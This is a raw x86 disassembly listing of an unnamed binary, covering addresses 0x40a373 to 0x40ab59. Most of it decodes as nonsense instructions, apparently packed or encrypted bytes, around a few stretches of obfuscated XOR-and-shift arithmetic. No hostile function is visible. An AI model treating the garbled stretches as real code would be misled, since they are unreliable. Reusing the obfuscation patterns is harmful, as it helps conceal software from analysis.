  40a373:	sbb    BYTE PTR [edi],ah
  40a375:	into   
  40a376:	push   es
  40a377:	call   0xed898927
  40a37c:	loope  0x40a367
  40a37e:	popf   
  40a37f:	mov    ch,0xc6
  40a381:	dec    ebp
  40a382:	lahf   
  40a383:	lods   eax,DWORD PTR ds:[esi]
  40a384:	arpl   WORD PTR [edi],cx
  40a386:	mov    eax,DWORD PTR [eax-0x63]
  40a389:	in     al,0xb4
  40a38b:	fldenv [esi+0x14]
  40a38e:	mov    bl,0x8b
  40a390:	pop    edi
  40a391:	mov    eax,0x4cd1fd5f
  40a396:	or     bl,0xc5
  40a399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a39a:	jae    0x40a3c4
  40a39c:	dec    edx
  40a39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a39e:	call   0x180d:0xe8225d6c
  40a3a5:	jbe    0x40a3ca
  40a3a7:	pop    edi
  40a3a8:	ins    DWORD PTR es:[edi],dx
  40a3a9:	int    0x4b
  40a3ab:	pavgw  mm1,QWORD PTR [esi+0x24d39be0]
  40a3b2:	ja     0x40a3dd
  40a3b4:	and    DWORD PTR [edi+0x16],0xffffffd3
  40a3b8:	mov    ds:0x5f62f08c,eax
  40a3bd:	push   esp
  40a3be:	dec    edx
  40a3bf:	data16 aaa 
  40a3c1:	nop
  40a3c2:	jle    0x40a3ab
  40a3c4:	mov    ebp,0xb03914ff
  40a3c9:	mov    eax,DWORD PTR [esi+0x680355e1]
  40a3cf:	int    0x64
  40a3d1:	(bad)  
  40a3d2:	pop    ecx
  40a3d3:	shr    DWORD PTR [edi-0x50],cl
  40a3d6:	into   
  40a3d7:	jmp    0xd953:0x11252567
  40a3de:	fs mov dh,0x2b
  40a3e1:	cli    
  40a3e2:	imul   ebp,ebx,0x8d6fc58e
  40a3e8:	inc    esi
  40a3e9:	inc    ecx
  40a3ea:	xor    al,ch
  40a3ec:	loop   0x40a37f
  40a3ee:	imul   BYTE PTR [ebx-0x2f5cb9b6]
  40a3f4:	add    ebx,DWORD PTR [esi-0x72d599d4]
  40a3fa:	pusha  
  40a3fb:	fld    DWORD PTR [ecx]
  40a3fd:	add    ah,BYTE PTR [edi+0x2]
  40a400:	or     BYTE PTR [edx-0x5b],ah
  40a403:	adc    dl,ch
  40a405:	or     DWORD PTR [eax-0x6c63f075],edx
  40a40b:	jp     0x40a417
  40a40d:	sti    
  40a40e:	adc    eax,0x8ea7da98
  40a413:	enter  0x1994,0x13
  40a417:	daa    
  40a418:	jno    0x40a3be
  40a41a:	test   al,0x28
  40a41c:	std    
  40a41d:	int3   
  40a41e:	lods   al,BYTE PTR ds:[esi]
  40a41f:	push   0xea6f2bf
  40a424:	or     BYTE PTR [edx-0x61],ah
  40a427:	xor    cl,BYTE PTR ds:0x3a680a76
  40a42d:	add    al,BYTE PTR [esi]
  40a42f:	(bad)  
  40a431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a433:	sti    
  40a434:	xor    DWORD PTR [esi],ecx
  40a436:	mov    ch,0xea
  40a438:	shl    DWORD PTR [esi+0x6956bb98],1
  40a43e:	(bad)
  40a441:	data16 cli 
  40a443:	into   
  40a444:	icebp  
  40a445:	dec    eax
  40a446:	into   
  40a447:	js     0x40a3cc
  40a449:	std    
  40a44a:	mov    bh,0x89
  40a44c:	or     DWORD PTR [ecx],eax
  40a44e:	jbe    0x40a48d
  40a450:	xchg   DWORD PTR [ecx+esi*4],esp
  40a453:	sbb    ebx,DWORD PTR [edi-0x7aadbcbc]
  40a459:	mov    eax,ds:0xbd1e14cf
  40a45e:	or     dh,BYTE PTR [eax+0x2395f648]
  40a464:	xchg   ebp,eax
  40a465:	and    al,0x82
  40a467:	imul   eax,DWORD PTR [edx+0x16],0xfffffff7
  40a46b:	mov    ebp,0x7dd6860c
  40a470:	and    DWORD PTR [ebx+0x4e],ebx
  40a473:	adc    ch,BYTE PTR [ecx+0x2f]
  40a476:	repz mov al,0xc6
  40a479:	jno    0x40a4e3
  40a47b:	push   es
  40a47c:	call   0x58fd:0xca24f065
  40a483:	cmp    BYTE PTR [ebp-0x6],dh
  40a486:	test   ebp,0x58b9f524
  40a48c:	fstp   QWORD PTR cs:[edx+ebp*1-0x20]
  40a491:	shr    ch,1
  40a493:	add    DWORD PTR [esi+0x4912cd89],esi
  40a499:	mov    ch,bh
  40a49b:	repnz inc ebp
  40a49d:	sub    esi,0x9a01e12b
  40a4a3:	mov    al,0x46
  40a4a5:	mov    DWORD PTR [edi+0x2c579efb],edx
  40a4ab:	je     0x40a4c0
  40a4ad:	sbb    BYTE PTR ds:0x372c14d9,ah
  40a4b3:	mov    eax,0x1b9a09e
  40a4b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4b9:	jns    0x40a509
  40a4bb:	test   al,0x2f
  40a4bd:	ja     0x40a502
  40a4bf:	stc    
  40a4c0:	sbb    al,0x20
  40a4c2:	xchg   edx,eax
  40a4c3:	and    edi,eax
  40a4c5:	mov    ah,al
  40a4c7:	in     al,0xf4
  40a4c9:	ja     0x40a4ff
  40a4cb:	scas   al,BYTE PTR es:[edi]
  40a4cc:	mov    ds:0x84d2b942,eax
  40a4d1:	fsub   DWORD PTR [eax+0x3e7b65b2]
  40a4d7:	mov    BYTE PTR [esi-0x72],cl
  40a4da:	fwait
  40a4db:	jmp    0xefcc:0x3cbe02a4
  40a4e2:	push   ebp
  40a4e3:	test   al,0x75
  40a4e5:	xor    eax,0x62a532ad
  40a4ea:	hlt    
  40a4eb:	sbb    DWORD PTR [edi+0x48b4e3b7],esp
  40a4f1:	ss and bh,ah
  40a4f4:	mov    edi,0xc726e8
  40a4f9:	add    BYTE PTR [ebx+0x44e8b06],cl
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a573
  40a524:	jmp    0x40a4bf
  40a526:	mov    esp,0x18182bd8
  40a52b:	sahf   
  40a52c:	adc    bl,BYTE PTR [eax]
  40a52e:	sbb    BYTE PTR [ecx-0x6020f36e],ch
  40a534:	or     eax,0x2c0a37ed
  40a539:	fwait
  40a53a:	pop    eax
  40a53b:	inc    esi
  40a53c:	fidivr WORD PTR [ebx-0x1]
  40a53f:	stos   BYTE PTR es:[edi],al
  40a540:	add    ebx,0x8f98c4a2
  40a546:	adc    al,0xae
  40a548:	int3   
  40a549:	push   0xbbcace08
  40a54e:	mov    edi,0x41625614
  40a553:	jo     0x40a598
  40a555:	clc    
  40a556:	int    0xd1
  40a558:	inc    ecx
  40a559:	popa   
  40a55a:	mov    cl,0x61
  40a55c:	or     esp,ecx
  40a55e:	adc    BYTE PTR [eax-0x2e],0x27
  40a562:	nop
  40a563:	sub    BYTE PTR [ecx-0x558246b6],al
  40a569:	add    eax,0xfee4dcf1
  40a56e:	push   esi
  40a56f:	mov    esp,0xf680f65a
  40a574:	sub    al,0x6e
  40a576:	dec    ebx
  40a577:	inc    eax
  40a578:	pop    esp
  40a579:	rol    esp,1
  40a57b:	ror    BYTE PTR [ebp+0x2f5edc3e],0xe2
  40a582:	dec    edi
  40a583:	addr16 pop edx
  40a585:	jae    0x40a527
  40a587:	(bad)
  40a58b:	inc    edi
  40a58c:	fsub   QWORD PTR [ebp+0x3a43d79b]
  40a592:	pop    es
  40a593:	mov    ch,0x60
  40a595:	mov    al,0xff
  40a597:	inc    esi
  40a598:	call   0x1e5b4d03
  40a59d:	imul   edi,DWORD PTR [edx-0xe],0xe3dcf370
  40a5a4:	pusha  
  40a5a5:	xor    DWORD PTR [edx+0x50],esi
  40a5a8:	das    
  40a5a9:	jecxz  0x40a597
  40a5ab:	fwait
  40a5ac:	dec    ebx
  40a5ad:	(bad)  
  40a5ae:	and    BYTE PTR [ebx+ebp*2],dh
  40a5b1:	test   al,0x1a
  40a5b3:	push   ecx
  40a5b4:	pushf  
  40a5b5:	sbb    esp,DWORD PTR [ebx+eax*2+0x78]
  40a5b9:	imul   BYTE PTR [ebp-0x6b351a2e]
  40a5bf:	mov    dl,0xbe
  40a5c1:	jb     0x40a586
  40a5c3:	(bad)  
  40a5c4:	stos   BYTE PTR es:[edi],al
  40a5c5:	inc    ecx
  40a5c6:	rcr    ecx,1
  40a5c8:	mov    ch,0xbc
  40a5ca:	iret   
  40a5cb:	pusha  
  40a5cc:	xor    BYTE PTR ds:0xa864867d,ah
  40a5d2:	pop    ebp
  40a5d3:	std    
  40a5d4:	jbe    0x40a58a
  40a5d6:	in     al,dx
  40a5d7:	xor    BYTE PTR [eax-0xb1cd3f1],dl
  40a5dd:	and    al,BYTE PTR [ebx]
  40a5df:	repz out dx,eax
  40a5e1:	jle    0x40a5f7
  40a5e3:	ror    DWORD PTR [edx+eax*1-0x697e2687],1
  40a5ea:	push   es
  40a5eb:	(bad)  
  40a5ed:	or     ah,BYTE PTR [edi-0x63]
  40a5f0:	or     DWORD PTR [ebx+0x272fffca],edi
  40a5f6:	dec    ecx
  40a5f7:	mov    al,0x57
  40a5f9:	pop    es
  40a5fa:	arpl   WORD PTR [esi-0xc0ade0d],ax
  40a600:	shl    BYTE PTR [edi-0x7a],1
  40a603:	lock fwait
  40a605:	mov    gs,WORD PTR [esi]
  40a607:	fiadd  WORD PTR [esi+0x739d53b1]
  40a60d:	jo     0x40a665
  40a60f:	out    dx,eax
  40a610:	push   ds
  40a611:	(bad)  
  40a612:	sbb    BYTE PTR [eax-0x67f6dc5e],ch
  40a618:	test   eax,0x4ce09451
  40a61d:	loopne 0x40a647
  40a61f:	jge    0x40a5ac
  40a621:	cmp    DWORD PTR [ecx],0xffffffa5
  40a624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a625:	push   0x5396195d
  40a62a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a62b:	jmp    0xb9cdcbb4
  40a630:	hlt    
  40a631:	cwde   
  40a632:	jle    0x40a6a5
  40a634:	or     eax,esp
  40a636:	call   0xb15faa39
  40a63b:	sbb    ch,BYTE PTR [eax]
  40a63d:	dec    edx
  40a63e:	loopne 0x40a628
  40a640:	pop    edx
  40a641:	adc    BYTE PTR [eax+0x53bdcb5c],al
  40a647:	cmp    DWORD PTR [ebx-0x34a9b7be],eax
  40a64d:	aaa    
  40a64e:	jle    0x40a61c
  40a650:	ror    bh,cl
  40a652:	xlat   BYTE PTR ds:[ebx]
  40a653:	sbb    eax,DWORD PTR [edx-0x78]
  40a656:	xor    al,0x8b
  40a658:	and    ch,dh
  40a65a:	push   es
  40a65b:	jmp    DWORD PTR [eax-0x1a58fe5c]
  40a661:	adc    al,0xf3
  40a663:	pop    edx
  40a664:	repz xchg ebp,eax
  40a666:	sub    ebx,edx
  40a668:	adc    al,0xf8
  40a66a:	les    edx,FWORD PTR [edi]
  40a66c:	pop    ebp
  40a66d:	mov    ch,0x29
  40a66f:	jmp    0x62b4:0x3359c387
  40a676:	dec    ebx
  40a677:	ins    BYTE PTR es:[edi],dx
  40a678:	(bad)  
  40a679:	adc    eax,0x13e7da81
  40a67e:	and    al,0xa
  40a680:	jmp    0x5b32:0x320472c1
  40a687:	lea    edi,[esi+0x18]
  40a68a:	xchg   ebx,eax
  40a68b:	pop    ds
  40a68c:	cdq    
  40a68d:	pop    edx
  40a68e:	lahf   
  40a68f:	popa   
  40a690:	mov    eax,0xc00ec298
  40a695:	(bad)
  40a698:	xor    al,0x56
  40a69a:	inc    esi
  40a69b:	test   ah,0x60
  40a69e:	dec    esp
  40a69f:	and    esp,ecx
  40a6a1:	out    0x36,al
  40a6a3:	inc    ebx
  40a6a4:	(bad)  
  40a6a5:	in     al,0xbf
  40a6a7:	inc    ebx
  40a6a8:	xchg   edi,eax
  40a6a9:	popf   
  40a6aa:	sub    eax,0xf93140d5
  40a6af:	aam    0x4c
  40a6b1:	adc    ebx,DWORD PTR [esi-0x68f22add]
  40a6b7:	cs (bad) 
  40a6b9:	sbb    DWORD PTR [eax-0x72c98fb4],ebp
  40a6bf:	cmp    bl,BYTE PTR [esi+ecx*8-0x503aa1d1]
  40a6c6:	inc    edx
  40a6c7:	push   cs
  40a6c8:	push   eax
  40a6c9:	out    0x57,al
  40a6cb:	push   ecx
  40a6cc:	imul   esi,DWORD PTR [edx-0x7],0xc3479d8
  40a6d3:	clc    
  40a6d4:	xor    cl,dh
  40a6d6:	xor    bh,bl
  40a6d8:	xchg   edx,eax
  40a6d9:	add    eax,0x2377c61b
  40a6de:	or     BYTE PTR [esi-0x44],bh
  40a6e1:	push   ebp
  40a6e2:	ss stos BYTE PTR es:[edi],al
  40a6e4:	fbld   TBYTE PTR [esi-0x16]
  40a6e7:	push   0x318be3f2
  40a6ec:	mov    WORD PTR [edi+ecx*8],?
  40a6ef:	pop    ebp
  40a6f0:	mov    edx,0x74719fbf
  40a6f5:	les    ebp,FWORD PTR [esi+0x20822e22]
  40a6fb:	(bad)  
  40a6fc:	mov    cl,0xa9
  40a6ff:	xchg   ebp,eax
  40a700:	or     al,0xa3
  40a702:	shl    eax,cl
  40a704:	sbb    eax,0xaa7e62e0
  40a709:	popf   
  40a70a:	push   eax
  40a70b:	dec    edi
  40a70c:	xor    al,BYTE PTR [eax-0x5475a09d]
  40a712:	dec    ebp
  40a713:	push   edi
  40a714:	es inc edx
  40a716:	ret    
  40a717:	jge    0x40a786
  40a719:	mov    ds:0xb5ef397f,al
  40a71e:	cmp    DWORD PTR [edx-0x5e],eax
  40a721:	icebp  
  40a722:	sub    al,0xc0
  40a724:	scas   al,BYTE PTR es:[edi]
  40a725:	jnp    0x40a742
  40a727:	stc    
  40a728:	mov    ebp,DWORD PTR [edx]
  40a72a:	push   0xffffff82
  40a72c:	add    eax,0x34729b65
  40a731:	add    BYTE PTR [ebp+0x3a],ch
  40a734:	sub    ch,BYTE PTR [edi+0x5c7f2d4c]
  40a73a:	mov    dl,BYTE PTR [ecx+0x7428dbc]
  40a740:	mov    eax,ds:0xd97aec7a
  40a745:	dec    ecx
  40a746:	jo     0x40a7b8
  40a748:	and    DWORD PTR [esp+eiz*4-0x4b083ddf],ebp
  40a74f:	mov    edx,0x38f73117
  40a754:	jnp    0x40a770
  40a756:	leave  
  40a757:	pop    ebp
  40a758:	sbb    bl,BYTE PTR [ebp+0x9]
  40a75b:	pushf  
  40a75c:	nop
  40a75d:	fcomi  st,st(1)
  40a75f:	cwde   
  40a760:	pop    eax
  40a761:	mov    DWORD PTR [ecx+0x23],eax
  40a764:	enter  0x7512,0x62
  40a768:	(bad)  
  40a769:	loopne 0x40a767
  40a76b:	mov    edx,DWORD PTR [eax-0x39]
  40a76e:	fdiv   QWORD PTR [edi-0x6e0c639d]
  40a774:	mov    cl,0xfa
  40a776:	mov    bl,0x90
  40a778:	mov    al,0xb5
  40a77a:	cmovne edx,DWORD PTR fs:0x5b6ad8d9
  40a782:	mov    esp,0xdd34fb86
  40a787:	inc    eax
  40a788:	adc    esi,eax
  40a78a:	lock arpl dx,cx
  40a78d:	popf   
  40a78e:	pop    esp
  40a78f:	arpl   WORD PTR [edx],cx
  40a791:	jge    0x40a71e
  40a793:	les    eax,FWORD PTR [esi-0x47ea97ab]
  40a799:	idiv   DWORD PTR [edx]
  40a79b:	test   al,0x1
  40a79d:	cmp    eax,0x453f8d00
  40a7a2:	dec    eax
  40a7a3:	dec    edi
  40a7a4:	cmp    DWORD PTR [esi-0x7e],edx
  40a7a7:	jmp    0x798e2586
  40a7ac:	repnz or eax,0x77437204
  40a7b2:	xor    BYTE PTR [edx+0x65],bl
  40a7b5:	pop    esp
  40a7b6:	ins    BYTE PTR es:[edi],dx
  40a7b7:	inc    edx
  40a7b8:	push   ss
  40a7b9:	imul   esp,DWORD PTR [edi],0x38643b9
  40a7bf:	adc    BYTE PTR [edx],dl
  40a7c1:	sahf   
  40a7c2:	sbb    BYTE PTR [ebx],dl
  40a7c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7c5:	mov    bl,0x4
  40a7c7:	mov    ecx,0xc0f3b20a
  40a7cc:	mov    ecx,0x1ef3f875
  40a7d1:	pop    ds
  40a7d2:	inc    esi
  40a7d3:	sub    bl,BYTE PTR [edi+0x1d]
  40a7d6:	aam    0x75
  40a7d8:	inc    edi
  40a7d9:	pop    esi
  40a7da:	lods   eax,DWORD PTR ds:[esi]
  40a7db:	cmp    DWORD PTR [ebp-0x5f],0xfffffff7
  40a7df:	std    
  40a7e0:	sbb    eax,edx
  40a7e2:	fcomp  st(6)
  40a7e4:	mov    BYTE PTR [ecx],dl
  40a7e6:	push   ss
  40a7e7:	pop    ss
  40a7e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7e9:	lea    ebp,[edx-0x7b]
  40a7ec:	setno  bh
  40a7ef:	fcmovnu st,st(3)
  40a7f1:	std    
  40a7f2:	xchg   edi,eax
  40a7f3:	aas    
  40a7f4:	addr16 push edi
  40a7f6:	bound  edx,QWORD PTR [esi]
  40a7f8:	retf   
  40a7f9:	xchg   cl,ah
  40a7fb:	xor    al,0xdb
  40a7fd:	rol    DWORD PTR [ebx-0x47],1
  40a800:	push   cs
  40a801:	cmp    DWORD PTR [eax-0x2db984be],ebp
  40a807:	xor    al,0x90
  40a80a:	scas   al,BYTE PTR es:[edi]
  40a80b:	add    dl,dh
  40a80d:	pop    edx
  40a80e:	ja     0x40a7d5
  40a810:	push   cs
  40a811:	dec    eax
  40a812:	fmul   QWORD PTR [ebx]
  40a814:	outs   dx,DWORD PTR ds:[esi]
  40a815:	pop    ecx
  40a816:	jge    0x40a7a5
  40a818:	mov    dl,0x31
  40a81a:	data16 jb 0x40a82a
  40a81d:	clc    
  40a81e:	sbb    BYTE PTR [edx],cl
  40a820:	xchg   esp,eax
  40a821:	add    eax,0xb6b1afbe
  40a826:	fadd   QWORD PTR [edi-0x4d373fc4]
  40a82c:	push   cs
  40a82d:	out    dx,eax
  40a82e:	arpl   WORD PTR [eax+0x17f10c15],bp
  40a834:	mov    dl,0xaa
  40a836:	jecxz  0x40a872
  40a838:	mov    al,0x2e
  40a83a:	leave  
  40a83b:	or     DWORD PTR [ebx],esp
  40a83d:	jle    0x40a87b
  40a83f:	mov    ah,0x3f
  40a841:	adc    al,0xb9
  40a843:	je     0x40a873
  40a845:	std    
  40a846:	(bad)  
  40a847:	pop    edi
  40a848:	arpl   WORD PTR ds:0xc3cdc627,cx
  40a84e:	push   ds
  40a84f:	into   
  40a850:	bound  ebp,QWORD PTR [ecx-0x443cb255]
  40a856:	cdq    
  40a857:	jmp    0x40a89c
  40a859:	scas   al,BYTE PTR es:[edi]
  40a85a:	inc    edi
  40a85b:	cmp    al,0x4e
  40a85d:	into   
  40a85e:	sar    DWORD PTR [eax-0x6a],cl
  40a861:	or     DWORD PTR [edi-0x57],esp
  40a864:	xchg   esp,eax
  40a865:	adc    DWORD PTR [eax-0x2],eax
  40a868:	std    
  40a869:	cmp    edx,edi
  40a86b:	nop
  40a86c:	inc    DWORD PTR [ebp-0x3dd32f21]
  40a872:	test   eax,0x73e66431
  40a877:	rol    DWORD PTR [ecx+0x67],0x94
  40a87b:	jb     0x40a871
  40a87d:	cld    
  40a87e:	jo     0x40a880
  40a880:	xchg   esi,eax
  40a881:	scas   eax,DWORD PTR es:[edi]
  40a882:	retf   
  40a883:	mov    bl,BYTE PTR [edx+0x1c]
  40a886:	inc    eax
  40a887:	gs das 
  40a889:	push   edx
  40a88a:	add    BYTE PTR cs:[esi+edx*4],cl
  40a88e:	cdq    
  40a88f:	push   edi
  40a890:	addr16 cmp eax,edx
  40a893:	leave  
  40a894:	mov    ds:0x55bc597f,al
  40a899:	jmp    0x6bb4:0xfa67992
  40a8a0:	fbstp  TBYTE PTR [edi]
  40a8a2:	and    esi,DWORD PTR [ecx+0x1bbc66e2]
  40a8a8:	std    
  40a8a9:	sbb    al,0x93
  40a8ab:	aaa    
  40a8ac:	sub    BYTE PTR [edx-0x54c789e9],bl
  40a8b2:	sub    edx,esi
  40a8b4:	dec    edi
  40a8b5:	jae    0x40a8ae
  40a8b7:	xor    DWORD PTR [edx+0x45462e35],ebp
  40a8bd:	xor    cl,BYTE PTR [esp+edx*4+0x251fedda]
  40a8c4:	lock fst DWORD PTR [esi-0x80]
  40a8c8:	out    dx,al
  40a8c9:	shl    BYTE PTR [ebp+0x110b2e43],1
  40a8cf:	inc    ecx
  40a8d0:	mov    WORD PTR [ecx+0x30],?
  40a8d3:	sub    edi,0xffffffa0
  40a8d6:	mov    ds:0x6696e003,eax
  40a8db:	inc    sp
  40a8dd:	jae    0x40a8cd
  40a8df:	inc    eax
  40a8e0:	(bad)  
  40a8e2:	add    BYTE PTR [esi+0x72],dh
  40a8e5:	outs   dx,DWORD PTR ds:[esi]
  40a8e6:	mov    DWORD PTR [esi-0x36],0x6ac3680c
  40a8ed:	push   ebx
  40a8ee:	arpl   bp,sp
  40a8f0:	mov    DWORD PTR [ebp+0x10],edx
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x4282f3,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x4282e7,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428243,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x4282eb,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428273
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428267,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x4282e3
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42821b
  40aa46:	sbb    DWORD PTR ds:0x42815b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0xe17e1f6a
  40aa65:	jno    0x40aa2a
  40aa67:	jl     0x40aac8
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	pop    esi
  40aa71:	jl     0x40aa35
  40aa73:	loopne 0x40aac7
  40aa75:	test   al,0xc5
  40aa77:	cld    
  40aa78:	fcmovnbe st,st(3)
  40aa7a:	xor    BYTE PTR [esi+0x72],0x89
  40aa7e:	adc    eax,DWORD PTR [esi-0x2b]
  40aa81:	sbb    DWORD PTR [esi],edi
  40aa83:	fucomip st,st(5)
  40aa85:	push   edx
  40aa86:	js     0x40aaf3
  40aa88:	popa   
  40aa89:	aas    
  40aa8a:	iret   
  40aa8b:	std    
  40aa8c:	push   ebx
  40aa8d:	sub    DWORD PTR [eax+0x27],edi
  40aa90:	fs daa 
  40aa92:	sub    esp,DWORD PTR [bx+di]
  40aa95:	xor    DWORD PTR [ebp+0x7ea26246],0x4f5061a7
  40aa9f:	xor    ecx,DWORD PTR [edi-0x1287211d]
  40aaa5:	lock sbb esp,DWORD PTR ds:0xb1c60f99
  40aaac:	pop    es
  40aaad:	loopne 0x40aa72
  40aaaf:	push   DWORD PTR [edi]
  40aab1:	fsubr  QWORD PTR [ebp-0x60554012]
  40aab7:	js     0x40aa84
  40aab9:	pop    ds
  40aaba:	xor    BYTE PTR [eax],dh
  40aabc:	outs   dx,DWORD PTR ds:[esi]
  40aabd:	dec    ecx
  40aabe:	ret    
  40aabf:	fwait
  40aac0:	sub    edi,edx
  40aac2:	jecxz  0x40aaba
  40aac4:	enter  0x3e8a,0x75
  40aac8:	std    
  40aac9:	rol    DWORD PTR [esi],0xeb
  40aacc:	jmp    0x40aa98
  40aace:	int3   
  40aacf:	mov    bh,0xd1
  40aad1:	jle    0x40ab46
  40aad3:	pop    ds
  40aad4:	ja     0x40ab30
  40aad6:	std    
  40aad7:	mov    bl,0x82
  40aad9:	loopne 0x40aae6
  40aadb:	mov    bl,0x2a
  40aadd:	out    0xc3,al
  40aadf:	test   eax,0x81e12011
  40aae4:	sbb    al,0xbf
  40aae6:	test   al,0xe0
  40aae8:	stc    
  40aae9:	mov    esp,0x9a9d1f64
  40aaee:	popf   
  40aaef:	sub    bh,ah
  40aaf1:	call   0x4178:0xa857b927
  40aaf8:	cld    
  40aaf9:	repnz push 0x78
  40aafc:	xor    BYTE PTR ds:0x2bc0fd4f,ch
  40ab02:	(bad)  
  40ab04:	mov    ch,0x10
  40ab06:	ror    ch,0x97
  40ab09:	cmp    eax,ecx
  40ab0b:	stos   DWORD PTR es:[edi],eax
  40ab0c:	cmc    
  40ab0d:	or     ecx,DWORD PTR [esi+0x67]
  40ab10:	xor    edi,DWORD PTR [edx]
  40ab12:	mov    BYTE PTR [ecx+0x3dfd6495],dh
  40ab18:	xor    esp,DWORD PTR [eax]
  40ab1a:	sbb    dh,cl
  40ab1c:	push   edx
  40ab1d:	push   ecx
  40ab1e:	pop    edx
  40ab1f:	fwait
  40ab20:	and    eax,0x20fb6c01
  40ab25:	pop    ss
  40ab26:	stos   DWORD PTR es:[edi],eax
  40ab27:	push   esi
  40ab28:	push   ebx
  40ab29:	sbb    BYTE PTR [ebp+0x21],ch
  40ab2c:	test   BYTE PTR [esi+0x4],0x8c
  40ab30:	mov    BYTE PTR [ebx-0x152820f2],bh
  40ab36:	rol    BYTE PTR [edi],cl
  40ab38:	repz fmul QWORD PTR [ecx-0x2f898220]
  40ab3f:	sub    DWORD PTR [ecx+edi*1+0x46a5b40a],edx
  40ab46:	mov    dh,0xb7
  40ab48:	jmp    0x4168e5a2
  40ab4d:	mov    cl,0xdc
  40ab4f:	fdivr  DWORD PTR [ebx+0x43]
  40ab52:	add    edi,DWORD PTR [eax-0x2e2a171a]
  40ab58:	daa    
  40ab59:	dec    eax
